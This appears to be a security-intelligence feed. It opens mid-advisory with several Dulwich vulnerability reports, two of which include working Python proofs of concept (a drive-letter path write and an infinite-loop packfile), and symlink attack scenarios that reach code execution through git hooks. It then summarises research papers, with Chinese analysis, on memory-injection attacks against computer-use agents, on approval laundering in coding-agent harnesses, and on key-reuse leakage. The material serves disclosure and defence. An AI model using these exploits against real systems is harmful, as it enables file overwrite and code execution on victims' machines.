3. **SSH Key Overwrite:** Writing to `C:\\Users\\<victim>\\.ssh\\authorized_keys` to compromise remote servers accessible by the victim.
4. **CI/CD Compromise:** If a Windows-based CI/CD runner (e.g., GitHub Actions) automatically clones a malicious pull request, the runner is instantly compromised, potentially leaking repository secrets.

### Proof of Concept (PoC)
The following Python script (runnable on Linux) generates a malicious Git repository containing a payload that targets Windows clients.

```python
from dulwich.objects import Blob, Tree, Commit
from dulwich.repo import Repo
import os, tempfile

repo_path = tempfile.mkdtemp()
repo = Repo.init(repo_path)

# 1. Build the payload blob.
blob = Blob(); blob.data = b"pwned-by-drive-letter\\n"
repo.object_store.add_object(blob)

# 2. Build the malicious tree hierarchy: C:/Users/victim/evil.txt
evil_txt = Tree();   evil_txt[b"evil.txt"] = (0o100644, blob.id)
repo.object_store.add_object(evil_txt)
victim_dir = Tree(); victim_dir[b"victim"] = (0o040000, evil_txt.id)
repo.object_store.add_object(victim_dir)
users_dir  = Tree(); users_dir[b"Users"]   = (0o040000, victim_dir.id)
repo.object_store.add_object(users_dir)

# VULNERABILITY: The "C:" directory bypasses validation
c_drive    = Tree(); c_drive[b"C:"]        = (0o040000, users_dir.id)
repo.object_store.add_object(c_drive)

commit = Commit()
commit.tree = c_drive.id
commit.message = b"add feature"
commit.author = commit.committer = b"attacker <a@evil.example>"
commit.author_time = commit.commit_time = 1700000000
commit.author_timezone = commit.committer_timezone = 0
repo.object_store.add_object(commit)
repo.refs[b"refs/heads/main"] = commit.id

print(f"Malicious repo created at {repo_path}")
print(f"Clone with: dulwich clone {repo_path} /target/win/worktree")
# Result: A Windows checkout of this commit writes the payload directly to C:\\Users\\victim\\evil.txt
```

items.title: Dulwich: Infinite Loop Denial of Service (DoS) in Packfile Object Resolution
items.summary:
### Affected file
* `dulwich/pack.py` (Method: `Pack.resolve_object`)

### Description / Summary
A High-severity Denial of Service (DoS) vulnerability exists in the `Pack.resolve_object` method. When resolving an `OFS_DELTA` object, the resolver calculates the base offset using `base_offset = obj_offset - delta_offset`.

If a malicious packfile contains an `OFS_DELTA` object where `delta_offset` is `0`, the calculation `obj_offset - 0` resolves back to the current object's own offset. Because the implementation lacks a depth counter, a "visited" set, or an explicit rejection of `delta_offset == 0`, the resolver enters an infinite recursive loop, exhausting CPU resources and eventually crashing the process.

**Vulnerable Code Breakdown (`dulwich/pack.py`):**
```python
elif obj_type == OFS_DELTA:
    delta_offset = parse_pack_object_offset_at(...)
    base_offset = obj_offset - delta_offset          # VULNERABILITY: Self-reference if delta_offset == 0
    base_type, base_data = self.resolve_object(...)  # VULNERABILITY: Infinite recursion
```

### Potential impact

An attacker can trigger this infinite loop via any operation that walks packfiles (e.g., `dulwich clone`, `fetch`, `cat-file`, or internal `Pack.__getitem__` lookups). 

1. **CPU Exhaustion:** The process will spin at 100% CPU indefinitely.
2. **Denial of Service:** Any service using `dulwich` (web interfaces, CI/CD runners) will hang or crash, preventing legitimate repository access.
3. **Protocol Incompatibility:** This behavior violates the Git packfile specification. The standard `git` C client explicitly guards against this: `if (!base_offset) die("delta offset == 0 is invalid");`.

### POC (Proof of Concept)
The following Python script generates a 44-byte packfile that triggers the loop:

```python
from dulwich.pack import Pack
import struct, zlib, tempfile, os

# Build a single OFS_DELTA entry whose delta_offset is 0
type_ofs_delta = 6
header = bytes([(type_ofs_delta << 4) | 0])
ofs_bytes = bytes([0x00]) # delta_offset = 0
body = zlib.compress(b'')
raw = header + ofs_bytes + body

pack = b'PACK' + struct.pack('>I', 2) + struct.pack('>I', 1) + raw + (b'\x00' * 20)

fd, path = tempfile.mkstemp(suffix='.pack')
os.write(fd, pack); os.close(fd)

# Trigger: This call never returns and spins at 100% CPU
p = Pack(path)
obj = p[list(p.iterobjects())[0]]
```

### Possible solution
1. **Explicit Guard:** Add a check in `Pack.resolve_object` to reject `delta_offset == 0`:
   ```python
   if delta_offset == 0:
       raise CorruptPacksFile("OFS_DELTA has self-referential delta_offset=0")
   ```
2. **Recursion Depth:** Implement a depth limit (e.g., `MAX_DELTA_DEPTH = 50`) to prevent long, non-looping chains of deltas (OFS or REF).

items.title: Dulwich: Symlink write-through in checkout(paths=[]) via raw os.open bypasses all symlink protections
items.summary:
## Summary

Dulwich's `porcelain.checkout(paths=[...])` code path writes files using raw `os.open(file_path, O_WRONLY|O_CREAT|O_TRUNC, mode)` followed by `f.write(obj.data)`. This code path does NOT call `build_file_from_blob()` at all, completely bypassing any symlink protections (including the unreleased d09f8af fix). `os.open` without `O_NOFOLLOW` follows symlinks at both the target file and intermediate directories, allowing arbitrary file writes.

## Root Cause

At `dulwich/porcelain/__init__.py:5661-5675`, the `checkout(paths=[...])` implementation:

```python
file_path = _checked_worktree_path(r, path)
os.makedirs(os.path.dirname(file_path), exist_ok=True)
flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC
with os.fdopen(os.open(file_path, flags, mode), "wb") as f:
    f.write(obj.data)
```

`_checked_worktree_path()` (line 601-631) only performs name validation — checking that the path doesn't start with `/` or `\\` and that components pass `INVALID_DOTNAMES` checks. It performs zero filesystem symlink detection.

## Impact

An attacker can craft a malicious repository that, when a victim clones it and runs `checkout(paths=[...])`, writes attacker-controlled content (with attacker-controlled permissions) to any filesystem location accessible to the user. Writing to `.git/hooks/post-checkout` achieves RCE on the next git checkout.

## Attack Scenario

1. Attacker creates a repository where HEAD has `trigger` as a symlink (mode 120000, content `../../.git/hooks/post-checkout`), and tag `v1.0` has `trigger` as an executable file (mode 100755, content `#!/bin/sh\nmalicious_payload`)
2. Victim clones the repository — worktree has `trigger` → `../../.git/hooks/post-checkout` (a symlink)
3. Victim runs `porcelain.checkout(repo, target="v1.0", paths=["trigger"])` to restore a specific file from a tag
4. `_checked_worktree_path(r, "trigger")` passes — name validation only, no symlink check
5. `os.open("trigger", O_WRONLY|O_CREAT|O_TRUNC, 0o755)` follows the symlink → opens `.git/hooks/post-checkout` for writing
6. `f.write(obj.data)` writes the malicious payload to the hook
7. Next checkout operation triggers the hook → RCE

## Suggested Fix

Replace the raw `os.open` path with a call to `build_file_from_blob` (once that function is hardened against intermediate symlinks), or add explicit symlink detection: resolve the path with `os.path.realpath()` and verify it stays within the worktree root before opening.

Reported by **zx (Jace)**

items.title: Dulwich: Symlink directory traversal in filter-branch index_filter via cross-commit state persistence
items.summary:
## Summary

Dulwich's `filter_branch.py` `CommitFilter._apply_index_filter()` is vulnerable to symlink directory traversal. When processing commit history, materialized tree entries (including symlinks) persist in the working directory between commits, allowing a symlink from an ancestor commit to redirect file writes from a descendant commit to arbitrary filesystem locations.

## Root Cause

`_apply_index_filter()` at `dulwich/filter_branch.py:212` calls `build_index_from_tree(".", tmp_index_path, ...)` which materializes all tree entries to the current working directory. The `finally` block (line 229-230) only cleans up the temporary index file (`os.unlink(tmp_index_path)`) — NOT the filesystem files written to CWD. When `process_commit()` processes parents recursively first (line 260), files materialized from ancestor commits persist and affect processing of descendant commits.

On dulwich 1.2.7, `build_file_from_blob()` has no symlink protection, and `validate_path_element` only validates name patterns, not filesystem state.

## Impact

An attacker can craft a malicious repository where running `filter_branch` with an index filter writes attacker-controlled content to arbitrary filesystem locations via symlink traversal. This achieves RCE if the write targets `.git/hooks/`.

## Attack Scenario

1. Attacker creates a repository where commit history (linearized) has:
   - Ancestor commit: tree entry `evil` (mode 120000, symlink → `/target_dir`)
   - Descendant commit: tree entry `evil/payload` (mode 100644, attacker content)
2. Victim clones repository and runs `filter_branch` with an index filter

items.title: Dulwich: Symlink directory traversal in stash pop allows arbitrary file write via intermediate directory symlinks
items.summary:
## Summary

Dulwich's `stash.py:pop()` function is vulnerable to symlink directory traversal, allowing an attacker to write arbitrary files outside the repository worktree when a victim pops a stash in a malicious repository.

## Root Cause

The `pop()` function at `dulwich/stash.py:236` uses `os.path.exists(parent_dir)` to check if a parent directory exists before writing stashed files. `os.path.exists()` follows symlinks, so when an intermediate directory in the path is a symlink pointing outside the worktree (e.g., `link → ../../.git/hooks`), the check passes and subsequent file writes resolve through the symlink.

The `validate_path()` function (line 228) only validates path component names against `INVALID_DOTNAMES` — it performs zero filesystem symlink detection. On dulwich 1.2.7 (latest release), `build_file_from_blob()` has no symlink protection whatsoever.

## Impact

An attacker can craft a malicious repository that, when a victim clones it and performs a stash pop operation, writes attacker-controlled content to arbitrary filesystem locations. Writing to `.git/hooks/post-checkout` achieves Remote Code Execution on the victim's machine on the next git checkout operation.

## Attack Scenario

1. Attacker creates a repository with branch `main` containing `link` (symlink → `../../.git/hooks`) and branch `feature` containing `link/post-checkout` (executable payload)
2. Victim clones the repository (landing on `main` — symlink `link` exists in worktree)
3. Victim checks out `feature`, makes changes, runs `stash.push()`
4. Victim checks out `main` (restoring the `link` symlink)
5. Victim runs `stash.pop(0)` — stash contains `link/post-checkout`
6. `os.path.exists("link")` returns True (symlink to existing directory), `os.makedirs` skipped
7. `build_file_from_blob(blob, mode, "link/post-checkout")` → `open("link/post-checkout", "wb")` follows the intermediate symlink → payload written to `.git/hooks/post-checkout`
8. Next checkout operation triggers the hook → RCE

## Suggested Fix

Before writing any file, verify that no component of the target path resolves through a symlink outside the worktree. Use `os.path.realpath(parent_dir)` and confirm it stays within the repository root. Alternatively, use `os.open()` with `O_NOFOLLOW` on each path component.

Reported by **zx (Jace)**

items.title: ZoneClaw: Mitigating Persistent Memory Attacks by Establishing Memory-Zoning in OpenClaw-Style Computer-Use Agents
items.summary: Computer-use agents increasingly operate as long-running assistants through persistent workspace memory, which OpenClaw-style CUAs realize as automatically reloaded files that hold user instructions, system summaries, and external claims at the same privilege level. Here, remembering a claim confers authority over later behavior. This enables a persistent memory attack, in which an attacker who controls only benign-looking external content induces the CUA to record attacker-favored claims during a legitimate task, and those claims later govern benign tasks the attacker never touches. The attack chain extends "malicious context -> malicious response" into "malicious context -> memory injection -> malicious execution", making this a cross-environment threat. Existing defenses studied intervene either before content enters memory or at the action it later induces, not whether stored content may guide action. We propose ZoneClaw, which separates persistence from authority by replacing flat workspace memory with hierarchical trust zones carrying explicit authority levels. External claims persist in a low-trust zone and acquire action-guiding authority only by crossing an explicit authority boundary, at which promotion is cross-checked against zones the attacker cannot directly write. Role-specific processes of asymmetric privilege enforce this boundary, ensuring that no process both ingests external content and acts outward. Across four attack scenarios, two injection settings, and four backbones, ZoneClaw drives ASR from 372/480 to 6/480 while retaining utility in 458/480 trials, and remains effective against some defense-aware attackers. Attacker claims still persist in low-trust memory yet rarely cross the authority boundary, showing that ZoneClaw withholds authority rather than refusing to learn from the environment. Our code is available at: https://github.com/euph00/ZoneClaw-code.

llm_summary.summary_zh: 该论文研究的是 OpenClaw 风格「计算机使用代理」（CUA，Computer-Use Agent）中的持久化记忆攻击问题。这类代理以长期助手形式运行，通过持久化工作区记忆保存用户指令、系统摘要以及来自外部来源的声明（claims）。关键缺陷在于：这些自动重新加载的记忆文件处于同一权限层级，因此「记住了某条声明」就等于「赋予该声明在未来行为上的权威」，即记忆的持久性与行为权威被混为一谈。作者据此提出持久化记忆攻击：攻击者只需控制看似无害的外部内容（如网页、文档、工具返回结果），诱导 CUA 在一次正常任务中把攻击者偏好的声明写入记忆；此后这些声明会在攻击者完全不接触的常规任务中支配代理行为，形成跨环境的威胁链——从「恶意上下文→恶意响应」延伸为「恶意上下文→记忆注入→恶意执行」。现有防御要么在内容进入记忆之前干预，要么在内容最终诱发的动作处拦截，都没有回答「已存储的内容是否有资格指导行动」这一问题。为此作者提出 ZoneClaw：把持久性与权威分离，用带显式权威等级的层次化信任区取代扁平工作区记忆。外部声明只能持久保存在低信任区，若要获得指导行动的权威，必须跨越显式权威边界；在提升（promotion）时，会与攻击者无法直接写入的信任区进行交叉校验。该边界由具有非对称权限的角色专用进程强制执行，确保没有任何单个进程既摄入外部内容又对外执行动作。实验覆盖 4 种攻击场景、2 种注入设置与 4 个骨干模型：ZoneClaw 将攻击成功率从 372/480 降至 6/480，同时在 458/480 次试验中保持正常效用，并且对部分具备防御意识的攻击者仍然有效。作者强调，攻击者声明依然保存在低信任记忆中，只是极少跨越权威边界，说明 ZoneClaw 是「扣留权威」而非「拒绝从环境学习」。代码已开源。
llm_summary.why_it_matters_zh: 持久记忆让一次注入长期驻留并跨会话生效，把 prompt injection 升级为「一次写入、长期支配」的跨环境威胁。ZoneClaw 给出「持久性≠权威」的可落地设计范式，适合在设计内部 AI 助手/浏览器代理时直接借鉴。
llm_summary.impact_zh: 适用于一切带持久化记忆的 LLM 代理：个人助理、浏览器/桌面自动化代理、RPA 与运维 copilot、IDE 代理、企业知识库机器人等。对防御方意味着记忆写入路径、跨信任区提升事件需要纳入审计与访问控制模型。
detection_signals_zh: 代理记忆（workspace memory）文件在非用户显式指令下被新增/修改，且写入内容可追溯到外部网页、邮件、文档或工具返回值
单条外部声明在后续多个互不相关的会话或任务中被重复引用并成为决策依据
同一进程既处理外部内容（抓取/解析/工具输出）又触发对外动作（写文件、发请求、执行命令）的权限组合
记忆中声明的来源无法与可信来源（用户指令、系统摘要）交叉校验，或校验失败仍被提升为高信任
会话间出现语义高度一致但来源异常的「指令式」文本漂移，尤其在新会话初始上下文中被自动加载
defense_advice_zh: 对代理记忆实施分区与显式权威分级：外部声明默认只能落入低信任区，不得直接参与行动决策
引入显式「权威提升」流程，提升时与攻击者不可直接写入的可信区做交叉校验，并记录完整审计日志
按角色拆分进程权限，保证没有单一进程同时摄入外部内容并对外执行动作（非对称权限、职责分离）
将记忆写入视为高敏感操作：区分用户指令、系统摘要与外部声明的写入通道与优先级
对长期运行的代理定期复核低信任记忆内容，并提供一键清除/降权机制，同时保留效用以便代理仍能从环境学习

items.title: Approval Laundering: Systematizing Approval--Execution Binding Failures in AI Coding-Agent Harnesses
items.summary: Modern AI coding-agent harnesses (Claude Code, Codex CLI, Cursor) rest their security boundary on a largely unexamined assumption: that the action A a human approves is the same action A' the harness executes, where A is fixed by a stated policy for what a scope grant or session-scoped approval authorizes. We show this assumption fails systematically and reproducibly. We introduce Approval Laundering, a taxonomy of six failure modes by which a harness's enforcement mechanism silently substitutes A' for A after approval: Scope, Argument, Temporal, Tool, Delegation, and Semantic laundering. Unlike prior work that evaluates risk classifiers against static corpora or infers implicit authorization boundaries, we study credential-binding integrity: given an already-approved action, does the harness dispatch exactly that action? Instrumenting Claude Code's pre-execution mediation point (PreToolUse), we conduct a controlled, headless, repeated-measures study of all six classes (N=19-20 runs each), reporting a Bound-Gap Rate (BGR) with Wilson confidence intervals and inter-rater agreement (kappa=1.0). We prototype Approval Token, a keyed capability Hk(principal, agent_id, session_id, tool, arguments, scope, expiry) issued by a mediator that never returns the key to the agent, evaluated via paired before/after replay of 118 runs (McNemar's exact test). The token fully eliminates Delegation laundering and, for our seeded session-identity-mismatch construction, Temporal laundering (p<10^-5), but by design leaves Scope laundering unaffected and shows no significant reduction in Argument laundering (p=1): an honest negative result, since these two classes leave every recorded dispatch field unchanged, diverging one process level below what a field-only verifier can observe. We discuss implications for defenses that bind only at the tool-invocation boundary.

llm_summary.summary_zh: 论文聚焦 AI 编码代理 harness（Claude Code、Codex CLI、Cursor 等）的一个未被充分检验的安全假设：人类批准的动作 A，与 harness 实际执行的动作 A' 是同一个动作，其中 A 由作用域授权或会话级批准所声明的策略固定。作者指出该假设会系统性且可复现地失效，并提出 "Approval Laundering"（审批洗白）这一分类学，将失效归纳为六类：Scope（作用域漂移）、Argument（参数替换）、Temporal（时序/会话身份错配）、Tool（工具替换）、Delegation（委派给子代理或下游执行体）、Semantic（语义层改写）。与既有工作（用静态语料评测风险分类器、推断隐式授权边界）不同，本文研究的是"凭据绑定完整性"：给定一个已被批准的动作，harness 是否精确派发该动作。方法上，作者在 Claude Code 的执行前中介点 PreToolUse 处插桩，开展受控、无头（headless）、重复测量实验，对六类失败各做 N=19–20 次运行，报告 Bound-Gap Rate（BGR）及其 Wilson 置信区间，评分者间一致性 kappa=1.0。随后作者原型化 Approval Token：由中介签发的带密钥能力令牌 Hk(principal, agent_id, session_id, tool, arguments, scope, expiry)，且密钥永不返回给代理本身；通过 118 次运行的配对前后回放并采用 McNemar 精确检验评估效果。结果显示：该令牌完全消除 Delegation 类洗白；对作者构造的会话身份错配场景可消除 Temporal 类洗白（p<10^-5）；但按设计对 Scope 类无效，且对 Argument 类没有显著降低（p=1）——这是一个诚实的负结果，原因是这两类的偏差不会改变任何被记录的派发字段，错位发生在比"仅校验字段"的验证器所能观测的层级更低一层。论文最后讨论了只在工具调用边界做绑定校验的防御方案的固有局限。
llm_summary.why_it_matters_zh: 许多团队已把"用户批准一次、会话内复用"当作代理的安全边界，但本文证明审批与执行之间存在系统性、可复现的错位。只看工具调用边界的校验会给出虚假安全感，迫使防御者把一致性校验下沉到派发与身份绑定层。
llm_summary.impact_zh: 直接影响 Claude Code、Codex CLI、Cursor 等编码代理 harness，以及任何采用作用域授权/会话级批准的 agent 平台与 MCP 工具调用链路；可迁移到企业内 agent 授权网关、CI 中的自动化代理、以及子代理委派场景。
detection_signals_zh: 批准动作与实际派发动作的字段级差异（工具名、参数、作用域、会话身份）
同一会话内批准后短时间内发生参数或目标路径变化
PreToolUse 等中介点的批准记录与执行日志不匹配
会话身份或 principal 与批准时绑定的身份不一致
出现向子代理/下游执行体的显式或隐式委派
工具调用边界校验通过但实际执行副作用超出已授权作用域
defense_advice_zh: 在派发点而非仅工具调用点校验批准凭据，确保"批准即执行"的一致性
把 principal、agent_id、session_id、工具、参数、作用域、过期时间一并绑定进不可伪造的批准令牌，且密钥不下发给代理
记录并比对批准记录与执行记录，对字段不变但语义漂移的 Scope/Argument 类行为做额外语义层校验
对委派链路（子代理、下游工具）要求显式重新授权，避免继承会话级批准
把审批-执行一致性纳入 agent 运行时的审计与回归测试，使用前后配对实验验证防护有效性
llm_summary.recommended_action_zh: 研究跟进，并纳入内部 agent 安全评估与授权网关设计评审

items.title: Key-Reuse Vulnerability of Phase-Keyed Fourier-Curve Modulation: Relation Leakage and Key-Refresh Cost on Coded Links
items.summary: The security of keyed modulation is often argued from the key-space size and the error rate of a key-less receiver. This evidence fails when the key is reused and the waveform is harmonically coupled. For a phase-keyed Fourier-curve constellation, whose $k$ tones share one data parameter, integer relations among the harmonic indices yield data-cancelling mixed moments of the received tones that expose key characters. A modular relation lattice characterizes the exposed characters; for consecutive harmonics, third-order moments recover the relative phases and a fourth-order moment completes the key up to cyclic relabeling whenever its coefficient is nonzero, as in all evaluated settings. A non-data-aided relation-moment estimator turns this leakage into an attack that never enumerates the key space. On a regular $(3,6)$ LDPC-coded link, one key per 168-symbol codeword leaves the eavesdropper a block error rate below $0.04$ at the middle noise level, and the attack meets a predeclared $0.1$ compromise criterion in eleven of twelve operating points. Tangent artificial noise and a harmonic set without relations below order four raise her measured error rate at intermediate reuse lengths but do not remove the one-codeword vulnerability. For a grid of $2^{128}$ protocol keys at the middle noise level, equal-length refresh schedules that keep a $95\%$ lower confidence bound of her block error rate above $0.9$ consume at least $1.52$ fresh key bits per information bit, $1.52$ times the entropy rate of a one-time pad on the data.

llm_summary.summary_zh: 该论文研究"相位键控傅里叶曲线调制"(phase-keyed Fourier-curve modulation)在密钥复用条件下的安全性。传统上，键控调制的安全性通常以密钥空间规模、以及无密钥接收机的误码率作为论据，但论文指出：当同一密钥被反复使用、且波形在谐波上存在耦合时，这类论据会失效。核心问题在于：若星座由 k 个音调共享同一个数据参数，则各谐波索引之间的整数关系会构造出"数据相消"的接收音调混合矩，从而暴露密钥字符。作者用模关系格(modular relation lattice)刻画可被暴露的密钥字符范围；对连续谐波而言，三阶矩可恢复相对相位，而其系数非零时四阶矩可将密钥恢复到循环重标号意义之下——论文称在所有评估设置中该系数均非零。作者进一步提出一种非数据辅助的关系矩估计器，把上述泄露转化为一种无需枚举密钥空间的攻击能力(文中不展开实现细节)。在常规 (3,6) LDPC 编码链路上，每个 168 符号码字使用一个密钥时，中等噪声水平下窃听者块错误率低于 0.04，且在预声明的 0.1"攻破"判据下，12 个工作点中有 11 个被满足。切线人工噪声以及不含四阶以下整数关系的谐波集合，能在中等复用长度下抬高窃听者的实测错误率，但无法消除"单码字即可被攻破"的脆弱性。在 2^128 个协议密钥的网格上、中等噪声条件下，若要求等长刷新调度使窃听者块错误率的 95% 下置信界保持在 0.9 以上，则至少需要为每个信息比特消耗 1.52 个新密钥比特，约为数据一次性密码本熵率的 1.52 倍。论文结论是：键控调制的安全论证必须同时考虑密钥复用与谐波耦合导致的关系泄露，并把密钥刷新成本作为协议设计的一等约束。
llm_summary.why_it_matters_zh: 它推翻了"密钥空间大 + 无密钥接收误码率高即安全"这一常见物理层安全论证，指出密钥复用与谐波整数关系会造成密钥泄露，并给出可量化的密钥刷新下界，直接影响键控调制协议与密钥管理设计。
llm_summary.impact_zh: 适用于采用键控/星座调制的物理层安全链路，尤其是 LDPC 编码的无线与卫星通信、军用及关键基础设施通信；影响密钥复用策略、刷新调度预算、星座与谐波集合选取以及人工噪声等防护措施的有效性评估。
detection_signals_zh: 密钥复用监测：统计同一密钥跨越的码字/帧数量，识别复用长度超过安全阈值的链路
密钥刷新速率与信息速率的比值低于论文给出的安全下界(如每信息比特 1.52 密钥比特)时告警
对接收信号的谐波分量做混合矩/相关性非随机性检验，出现与数据无关的稳定统计结构
接收端在启用人工噪声后，非授权接收者的错误率仍异常偏低，提示泄露仍存在
星座参数审计：谐波索引集合中存在低阶线性整数关系且带宽/数据共享参数重叠
defense_advice_zh: 不要把密钥空间大小或无密钥接收误码率当作充分安全证据，需针对键控调制单独做关系泄露评估
尽量避免密钥复用；无法避免时按风险模型确定最大复用长度并强制刷新调度
选择谐波索引集合时排除低阶整数关系(如四阶以下)，并验证其系数条件不成立
将密钥刷新开销纳入链路预算与协议设计，为高保障场景预留一次性密码本级别的密钥熵预算
人工噪声(如切线人工噪声)只作为纵深防御层，不能替代消除密钥复用与关系耦合的根本措施
在链路层监控密钥复用与刷新速率指标，将其作为可审计的安全配置项
llm_summary.recommended_action_zh: 研究跟进：纳入内部物理层安全/键控调制协议评审，复核现有链路的密钥复用长度与刷新预算
